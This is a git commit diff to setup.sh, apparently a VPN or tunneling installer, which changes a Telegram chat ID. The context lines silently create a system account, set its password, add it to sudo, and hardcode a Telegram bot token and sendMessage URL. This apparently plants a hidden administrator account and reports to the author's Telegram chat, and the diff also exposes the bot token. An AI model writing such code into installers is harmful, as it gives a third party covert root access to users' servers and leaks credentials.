11e8108f8b1452253ea9d945b9085aee0aca4538
[Riswan Tunneling] <vpnscriswan293@gmail.com>
2024-11-19 18:52:30 +0700

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -188,7 +188,7 @@ mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
 usermod -aG sudo $Username > /dev/null 2>&1
-CHATID="5521096873"
+CHATID="1002196928254"
 KEY="6668909715:AAHdCAC0NPVuXFjWEdueA2VvkkMl5Ie1WRQ"
 TIME="10"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
